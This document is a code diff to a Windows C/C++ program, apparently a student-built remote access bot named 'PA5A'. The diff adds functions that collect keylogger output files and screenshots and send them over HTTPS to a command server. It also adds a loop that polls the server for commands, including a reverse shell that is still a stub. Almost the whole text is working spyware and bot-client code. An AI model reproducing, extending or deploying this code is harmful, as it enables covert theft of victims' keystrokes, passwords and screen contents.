@@ -1,8 +1,6 @@
 #include "pa5a.hpp"
 
 EXTERN_C_START
-//#pragma warning(disable : 4996)
-
 
 DWORD ThreadKeylogger(VOID)
 {
@@ -21,190 +19,218 @@ DWORD ThreadKeylogger(VOID)
     ExitThread(0);
 }
 /********************************************************************************************************************************************************/
-VOID CreateConsole()
+VOID SendKeylogs()
 {
-    AllocConsole();
-    FILE* file = NULL;
+    HANDLE hFindData;
+    WIN32_FIND_DATA findData;
 
-    freopen_s(&file, "CONIN$", "r", stdin);
-    freopen_s(&file, "CONOUT$", "w", stdout);
-    freopen_s(&file, "CONOUT$", "w", stderr);
+    CHAR uuid[UUID_SIZE] = { 0 };
+    GetUuid(uuid);
+
+    if ((hFindData = FindFirstFile(DATA_FOLDER_W L"*.json", &findData)) == INVALID_HANDLE_VALUE)
+        return;
+
+    do
+    {
+        //Constructing path and filename
+        WCHAR path[PATH_SIZE] = { 0 };
+
+        if (StringCbPrintf(path, sizeof(path), L"%s%s", DATA_FOLDER_W, findData.cFileName) != S_OK)
+            continue;
+
+        wprintf(L"Sending file %ls ...\n", path);
+
+        HANDLE hFile;
+        if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
+            continue;
+
+        LARGE_INTEGER fileSize;
+        if (!GetFileSizeEx(hFile, &fileSize))
+        {
+            CloseHandle(hFile);
+            continue;
+        }
+
+        LPSTR fileContent = NULL;
+        if ((fileContent = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(CHAR))) == NULL)
+        {
+            CloseHandle(hFile);
+            continue;
+        }
+
+        DWORD bytesRead = 0;
+        if (!ReadFile(hFile, fileContent, fileSize.LowPart, &bytesRead, NULL))
+        {
+            CloseHandle(hFile);
+            continue;
+        }
+
+        CHAR url[URL_SIZE] = { 0 };
+        if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, KEYLOGS_API_A) != S_OK)
+        {
+            HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
+            CloseHandle(hFile);
+            continue;
+        }
+
+        SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "POST", USER_AGENT_A, fileContent);
+
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
+
+        CloseHandle(hFile);
+
+    } while (FindNextFile(hFindData, &findData) != 0);
+
+    FindClose(hFindData);
 }
 /********************************************************************************************************************************************************/
-INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) 
+VOID SendScreenshot()
+{
+    CHAR uuid[UUID_SIZE] = { 0 };
+    GetUuid(uuid);
+
+    WCHAR path[PATH_SIZE] = { 0 };
+
+    if (StringCbPrintf(path, sizeof(path), L"%s%s", DATA_FOLDER_W, L"screenshot.jpeg") != S_OK)
+        return;
+
+    wprintf(L"Taking screenshot in file %ls ...\n", path);
+
+    if (SaveScreenshot(path) == FALSE)
+        return;
+
+    HANDLE hFile;
+    if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
+        return;
+
+    LARGE_INTEGER fileSize;
+    if (!GetFileSizeEx(hFile, &fileSize))
+    {
+        CloseHandle(hFile);
+        return;
+    }
+
+    LPBYTE fileContent = NULL;
+    if ((fileContent = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(BYTE))) == NULL)
+    {
+        CloseHandle(hFile);
+        return;
+    }
+
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, fileContent, fileSize.LowPart, &bytesRead, NULL))
+    {
+        CloseHandle(hFile);
+        return;
+    }
+
+    DWORD destinationSize;
+    if (CryptBinaryToStringA((LPCBYTE)fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destinationSize) == FALSE)
+    {
+        CloseHandle(hFile);
+        return;
+    }
+
+    LPSTR base64string = NULL;
+    if ((base64string = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (destinationSize + 1000) * sizeof(CHAR)))) == NULL)
+    {
+        CloseHandle(hFile);
+        return;
+    }
+
+    if (CryptBinaryToStringA((LPCBYTE)fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64string, &destinationSize) == FALSE)
+    {
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
+        CloseHandle(hFile);
+        return;
+    }
+
+    cJSON* object = NULL;
+    LPSTR jsonString = NULL;
+
+    if ((object = cJSON_CreateObject()) == NULL)
+    {
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
+        CloseHandle(hFile);
+        return;
+    }
+
+    if (cJSON_AddStringToObject(object, "screenshot", base64string) == NULL)
+    {
+        cJSON_Delete(object);
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
+        CloseHandle(hFile);
+        return;
+    }
+
+    if ((jsonString = cJSON_Print(object)) == NULL)
+    {
+        cJSON_Delete(object);
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
+        CloseHandle(hFile);
+        return;
+    }
+
+    CHAR url[URL_SIZE] = { 0 };
+    if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, SCREENSHOT_API_A) != S_OK)
+    {
+        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
+        CloseHandle(hFile);
+        return;
+    }
+
+    SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "POST", USER_AGENT_A, jsonString);
+
+    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, jsonString);
+
+    cJSON_Delete(object);
+
+    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
+
+    DeleteFile(path);
+}
+/********************************************************************************************************************************************************/
+INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow) 
 {
     CreateConsole();
 
     //Thread de polling
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
 
+    CHAR uuid[UUID_SIZE] = { 0 };
+    GetUuid(uuid);
+
     while (TRUE)
     {
+        printf("Sending client informations\n");
+        if (!SendClientInformations())
+            continue;
 
-    }
-    /*while (TRUE)
-    {
-        sendClientInformations();
+        //Polling for new commands
+        printf("Polling for new commands ...\n");
+        Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);
 
-        struct CommandsToExecute commands;
-        commands = GetCommands(SERVER_URL_A, 443);
-        printf("Polling\n");
         if (commands.keylogs)
         {
-            printf("Envoi des logs\n");
-
-            HANDLE findDataHandle;
-            WIN32_FIND_DATA findData;
-            LARGE_INTEGER sizeDirectory;
-            findDataHandle = FindFirstFile(DATA_FOLDER_W L"\\*.json", &findData);
-
-            if (INVALID_HANDLE_VALUE == findDataHandle)
-                break;
-
-            do
-            {
-                LPWSTR bufferPath = NULL;
-                DWORD sizeBufferPath = (wcslen(DATA_FOLDER_W) + wcslen(L"\\") + wcslen(findData.cFileName)) * sizeof(WCHAR) + sizeof(WCHAR);
-                if ((bufferPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeBufferPath + sizeof(WCHAR))) == NULL)
-                {
-                    //Error not enough memory for buffer path
-                    break;
-                }
-
-                StringCbCatW(bufferPath, sizeBufferPath, DATA_FOLDER_W);
-                StringCbCatW(bufferPath, sizeBufferPath, L"\\");
-                StringCbCatW(bufferPath, sizeBufferPath, findData.cFileName);
-                wprintf(L"%ls\n", bufferPath);
-
-                HANDLE fileHandle = CreateFile(bufferPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-                printf("%d %d\n", fileHandle, GetLastError());
-
-                // Check for error
-                if (fileHandle == INVALID_HANDLE_VALUE)
-                {
-                    printf("Source file not opened. Error %u", GetLastError());
-                    return EXIT_FAILURE;
-                }
-
-                DWORD fileSize = 0;
-                fileSize = sizeof(findData.nFileSizeHigh) * 8;
-                fileSize |= findData.nFileSizeLow;
-
-                LPSTR buffer = NULL;
-                buffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
-
-                DWORD dwBytesRead = 0;
-                if (!ReadFile(fileHandle, buffer, fileSize, &dwBytesRead, NULL))
-                {
-                    printf("Source file not read from. Error %u", GetLastError());
-                }
-
-
-                CHAR uuid[UUID_SIZE] = { 0 };
-                CHAR url[URL_SIZE] = { 0 };
-
-                GetUuid(uuid);
-
-                //Construction de l'url
-
-                StringCbCatA(url, sizeof(url), CLIENT_API_A);
-                StringCbCatA(url, sizeof(url), (LPCSTR)uuid);
-                StringCbCatA(url, sizeof(url), KEYLOGS_API_A);
-
-                SendJsonDataByHttps(SERVER_URL_A, HTTPS_PORT, url, "POST", "PA5A-Bot", buffer);
-
-                HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, buffer);
-
-                CloseHandle(fileHandle);
-                HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, bufferPath);
-
-
-            } while (FindNextFile(findDataHandle, &findData) != 0);
-
-
-
-            FindClose(findDataHandle);
+            printf("Sending keylogs ...\n");
+            SendKeylogs();
         }
         if (commands.screenshot)
         {
-            if (SaveScreenshot(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg") == FALSE)
-                return FALSE;
-
-            HANDLE fileHandle = CreateFile(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-            LARGE_INTEGER fileSize = { 0 };
-            GetFileSizeEx(fileHandle, &fileSize);
-
-            LPBYTE buffer = NULL;
-            buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize.QuadPart + 1);
-
-            DWORD dwBytesRead = 0;
-            if (!ReadFile(fileHandle, buffer, fileSize.QuadPart, &dwBytesRead, NULL))
-            {
-                printf("Source file not read from. Error %u", GetLastError());
-            }
-
-            DWORD nDestinationSize;
-            if (CryptBinaryToStringA((LPCBYTE)buffer, fileSize.QuadPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &nDestinationSize))
-            {
-
-                LPSTR pszDestination = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nDestinationSize * sizeof(CHAR) + 10000));
-                if (pszDestination)
-                {
-                    if (CryptBinaryToStringA((LPCBYTE)buffer, fileSize.QuadPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pszDestination, &nDestinationSize))
-                    {
-
-                        cJSON* object = NULL;
-                        LPSTR jsonString = NULL;
-
-                        object = cJSON_CreateObject();
-
-                        cJSON_AddStringToObject(object, "screenshot", pszDestination);
-
-                        jsonString = cJSON_Print(object);
-                        printf("%s\n", jsonString);
-
-                        CHAR uuid[UUID_SIZE] = { 0 };
-                        CHAR url[URL_SIZE] = { 0 };
-
-                        GetUuid(uuid);
-
-                        StringCbCatA(url, sizeof(url), CLIENT_API_A);
-                        StringCbCatA(url, sizeof(url), (LPCSTR)uuid);
-                        StringCbCatA(url, sizeof(url), SCREENSHOT_API_A);
-
-                        printf("%s\n", url);
-
-                        SendJsonDataByHttps(SERVER_URL_A, HTTPS_PORT, url, "POST", "PA5A-Bot", jsonString);
-
-
-                        // Succeeded: 'pszDestination' is 'pszSource' encoded to base64.
-                    }
-                    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pszDestination);
-                }
-            }
-
-
-
-
-
-
-
-            _wremove(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg");
-            //printf("Screenshot envoyé\n");
-            printf("Envoi d'un screenshot\n");
+            printf("Sending screenshot ...\n");
+            SendScreenshot();
         }
-        if (commands.reverse_shell)
+        if (commands.reverseShell)
         {
-            //Programme de Samuel
+            printf("Opening reverse shell ...\n");
+            //Create Thread with Samuel's program
         }
-        Sleep(10000);
-    }*/
 
+        Sleep(5000);
+    }
 
     return 0;
 }
 /********************************************************************************************************************************************************/
 
 EXTERN_C_END
-
